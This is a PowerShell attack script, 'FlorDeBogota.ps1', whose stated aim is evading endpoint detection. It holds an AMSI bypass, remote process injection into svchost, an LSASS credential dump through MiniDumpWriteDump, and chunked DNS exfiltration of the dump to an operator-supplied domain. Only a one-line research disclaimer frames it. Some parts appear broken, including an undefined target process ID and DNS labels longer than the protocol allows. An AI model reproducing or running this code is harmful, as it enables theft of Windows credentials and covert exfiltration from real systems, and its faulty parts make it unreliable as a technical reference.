# FlorDeBogota.ps1
# Evasion: In-Memory LSASS Dump + DNS Exfil
# No HTTPS, No Assembly.Load, No Traces
#
# Purpose: Demonstrates evasion of EDRs by dumping LSASS in-memory and exfiltrating via DNS.
# Notes: For security research only. Test in a VM with Admin privileges. Assumes 64-bit Windows and process.
#        $Base64ProcDump is a placeholder; replace with base64-encoded custom dumper EXE if injection is used.
#        Currently uses MiniDumpWriteDump locally for simplicity; see STEP 5 notes for injected dump.

# Suppress verbose errors for stealth
$ErrorActionPreference = 'SilentlyContinue'

# —- CONFIGURATION ---
$DnsDomain = "yourdomain.com"  # Your DNS server (e.g., for TXT records)
$ChunkSize = 200  # DNS TXT limit ~255 chars; base64 chunks ~200 safe
$pipeArg = "\\.\pipe\$([Guid]::NewGuid())"  # Randomized pipe name for evasion

#—-- STEP 1: AMSI Bypass (Silent) ---
# Obfuscated to evade scanning
try {
    $am = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetTypes() | Where-Object { $_.FullName -like "*Amsi*" } } | Select-Object -First 1
    if ($am) {
        $am.GetField('amsiInitFailed', 'NonPublic, Static').SetValue($null, $true)
        Write-Host "AMSI bypassed..." -ForegroundColor Cyan
    } else {
        Write-Warning "AMSI type not found; bypass may not be needed or failed."
    }
}
catch {
    Write-Warning "AMSI bypass failed: $($_.Exception.Message)"
}

#—- STEP 2: Reflective PE Injection into svchost.exe (Optional for evasion; comment out if direct dump is fine)
# Define WinAPI functions via P/Invoke (for injection and MiniDumpWriteDump)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("dbghelp.dll", SetLastError = true)]
    public static extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

    public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
}
"@

# Function for full PE relocation (applied locally to PE bytes before writing to remote)
function Perform-Relocation {
    param (
        [byte[]]$PEBytes,
        [IntPtr]$RemoteBase
    )

    # Parse PE headers (assuming 64-bit; for 32-bit, adjust offsets and types)
    $dosSignature = [BitConverter]::ToUInt16($PEBytes, 0)
    if ($dosSignature -ne 0x5A4D) { Write-Error "Invalid PE signature"; return $null }

    $e_lfanew = [BitConverter]::ToInt32($PEBytes, 60)
    $ntSignature = [BitConverter]::ToUInt32($PEBytes, $e_lfanew)
    if ($ntSignature -ne 0x4550) { Write-Error "Invalid NT signature"; return $null }

    $optHeaderOffset = $e_lfanew + 24
    $machine = [BitConverter]::ToUInt16($PEBytes, $e_lfanew + 4)
    if ($machine -ne 0x8664) { Write-Error "Only 64-bit PE supported"; return $null }

    $imageBase = [BitConverter]::ToInt64($PEBytes, $optHeaderOffset + 16)  # ImageBase in OptionalHeader
    $relocRVA = [BitConverter]::ToInt32($PEBytes, $optHeaderOffset + 144)  # DataDirectory[5].VirtualAddress (Base Relocation)
    $relocSize = [BitConverter]::ToInt32($PEBytes, $optHeaderOffset + 148) # DataDirectory[5].Size
    $sizeOfImage = [BitConverter]::ToUInt32($PEBytes, $optHeaderOffset + 56)

    if ($relocRVA -eq 0 -or $relocSize -eq 0) { return $PEBytes }  # No relocations needed

    $delta = $RemoteBase.ToInt64() - $imageBase
    $relocOffset = $relocRVA  # Local offset in PEBytes

    $relocBytes = [byte[]]::new($PEBytes.Length)
    [System.Array]::Copy($PEBytes, $relocBytes, $PEBytes.Length)  # Work on copy

    $currentBlockOffset = $relocOffset
    while ($currentBlockOffset -lt ($relocOffset + $relocSize)) {
        $blockRVA = [BitConverter]::ToUInt32($relocBytes, $currentBlockOffset)
        $blockSize = [BitConverter]::ToUInt32($relocBytes, $currentBlockOffset + 4)

        if ($blockSize -eq 0) { break }

        for ($i = 8; $i -lt $blockSize; $i += 2) {
            $entry = [BitConverter]::ToUInt16($relocBytes, $currentBlockOffset + $i)
            if ($entry -eq 0) { continue }

            $type = $entry -shr 12
            $offset = $entry -band 0xFFF

            if ($type -eq 10) {  # IMAGE_REL_BASED_DIR64
                $fixupAddr = $blockRVA + $offset
                $oldValue = [BitConverter]::ToInt64($relocBytes, $fixupAddr)
                $newValue = $oldValue + $delta
                [BitConverter]::GetBytes($newValue) | ForEach-Object -Begin { $index = 0 } -Process { $relocBytes[$fixupAddr + $index] = $_; $index++ }
            }
        }

        $currentBlockOffset += $blockSize
    }

    return $relocBytes
}

# Example PE bytes (placeholder; replace with your base64-decoded custom dumper EXE if injection is used)
$Base64ProcDump = "TVqQAAMAAAAAAAA//8AALgAAAAAAAAAQAAA..."  # Placeholder; use real base64 for custom EXE
$procDumpBytes = [System.Convert]::FromBase64String($Base64ProcDump)

# Open target process handle
$targetHandle = [Kernel32]::OpenProcess([Kernel32]::PROCESS_ALL_ACCESS, $false, $targetPid)
if ($targetHandle -eq [IntPtr]::Zero) { Write-Error "Failed to open svchost: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"; exit }

try {
    # Parse sizeOfImage from PE header (more reliable than placeholder)
    $e_lfanew = [BitConverter]::ToInt32($procDumpBytes, 60)
    $optHeader = $e_lfanew + 24
    $sizeOfImage = [BitConverter]::ToUInt32($procDumpBytes, $optHeader + 56)

    # Allocate memory in target process
    $remoteBase = [Kernel32]::VirtualAllocEx($targetHandle, [IntPtr]::Zero, $sizeOfImage, [Kernel32]::MEM_COMMIT -bor [Kernel32]::MEM_RESERVE, [Kernel32]::PAGE_EXECUTE_READWRITE)
    if ($remoteBase -eq [IntPtr]::Zero) { Write-Error "VirtualAllocEx failed: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"; exit }

    # Perform relocation on local copy
    $relocatedBytes = Perform-Relocation -PEBytes $procDumpBytes -RemoteBase $remoteBase
    if ($relocatedBytes -eq $null) { Write-Error "Relocation failed"; exit }

    # Write relocated PE to remote memory
    $bytesWritten = [UIntPtr]::Zero
    $success = [Kernel32]::WriteProcessMemory($targetHandle, $remoteBase, $relocatedBytes, $relocatedBytes.Length, [ref]$bytesWritten)
    if (-not $success) { Write-Error "WriteProcessMemory failed: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"; exit }

    # Calculate remote entry point (parse from PE)
    $entryPointRVA = [BitConverter]::ToInt32($procDumpBytes, $optHeader + 16)
    $remoteEntryPoint = [IntPtr]($remoteBase.ToInt64() + $entryPointRVA)

    # Create remote thread
    $threadId = 0
    $threadHandle = [Kernel32]::CreateRemoteThread($targetHandle, [IntPtr]::Zero, 0, $remoteEntryPoint, [IntPtr]::Zero, 0, [ref]$threadId)
    if ($threadHandle -eq [IntPtr]::Zero) { Write-Error "CreateRemoteThread failed: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"; exit }

    Write-Host "Injection into svchost successful..." -ForegroundColor Cyan
} 
catch {
    Write-Error "Injection failed: $($_.Exception.Message)"
}
finally {
    if ($threadHandle -ne [IntPtr]::Zero) { [Kernel32]::CloseHandle($threadHandle) }
    [Kernel32]::CloseHandle($targetHandle)
}

# --- STEP 3: Obfuscated Arguments ---
# Fixed string obfuscation (for potential use in injected EXE)
$miniDumpArg = "M" + [char]0x0069 + "niDump"  # MiniDump
$lsassArg = [char]0x006C + [char]0x0073 + "a" + [char]0x0073 + [char]0x0073  # lsass
$args = @($miniDumpArg, $lsassArg, $pipeArg)  # Array for potential use in injected EXE

# --- STEP 4: Create Named Pipe ---
try {
    $pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pipeArg, [System.IO.Pipes.PipeDirection]::In, 1, [System.IO.Pipes.PipeTransmissionMode]::Byte, [System.IO.Pipes.NamedPipeServerOptions]::Asynchronous)
    $pipe.WaitForConnection()
    Write-Host "Named pipe created: $pipeArg" -ForegroundColor Cyan
}
catch {
    Write-Error "Failed to create pipe: $($_.Exception.Message)"
    exit
}

#--- STEP 5: Run LSASS Dump using MiniDumpWriteDump (in current process for simplicity)
# Note: For full evasion, move this logic to the injected EXE (requires custom EXE with MiniDumpWriteDump).
try {
    # Find LSASS process
    $lsass = Get-Process lsass

    # Open LSASS handle
    $lsassHandle = [Kernel32]::OpenProcess([Kernel32]::PROCESS_ALL_ACCESS, $false, $lsass.Id)
    if ($lsassHandle -eq [IntPtr]::Zero) { Write-Error "Failed to open LSASS: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"; exit }

    # Dump to pipe (MiniDumpFull = 2)
    $success = [Kernel32]::MiniDumpWriteDump($lsassHandle, $lsass.Id, $pipe.SafePipeHandle.DangerousGetHandle(), 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
    if (-not $success) { Write-Error "MiniDumpWriteDump failed: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"; exit }

    Write-Host "LSASS dumped to pipe..." -ForegroundColor Cyan
} 
catch {
    Write-Error "Dump failed: $($_.Exception.Message)"
    $pipe.Dispose()
    exit
}
finally {
    [Kernel32]::CloseHandle($lsassHandle)
}

#--- STEP 6: Read Dump from Pipe --
$bufferSize = 1GB  # Adjust based on expected dump size
$buffer = New-Object byte[] $bufferSize
$bytesRead = $pipe.Read($buffer, 0, $buffer.Length)
$dumpBytes = $buffer[0..($bytesRead - 1)]  # Trim to actual size

# --- STEP 7: DNS Exfil (Chunked) ---
$encodedDump = [System.Convert]::ToBase64String($dumpBytes)
$chunks = [Math]::Ceiling($encodedDump.Length / $ChunkSize)
$offset = 0
for ($i = 0; $i -lt $chunks; $i++) {
    $chunkLength = [Math]::Min($ChunkSize, $encodedDump.Length - $offset)
    $chunk = $encodedDump.Substring($offset, $chunkLength)
    $dnsQuery = "$chunk.$DnsDomain"

    # Send DNS query (TXT record for exfil)
    try {
        $response = Resolve-DnsName -Name $dnsQuery -Type TXT -ErrorAction SilentlyContinue
        Write-Host "Chunk $i sent via DNS..." -ForegroundColor Yellow
    } 
    catch {
        Write-Error "DNS exfil failed for chunk $i: $($_.Exception.Message)"
    }
    $offset += $ChunkSize
}

# —-- CLEANUP —--
$pipe.Dispose()
Write-Host "All chunks exfiltrated." -ForegroundColor Green
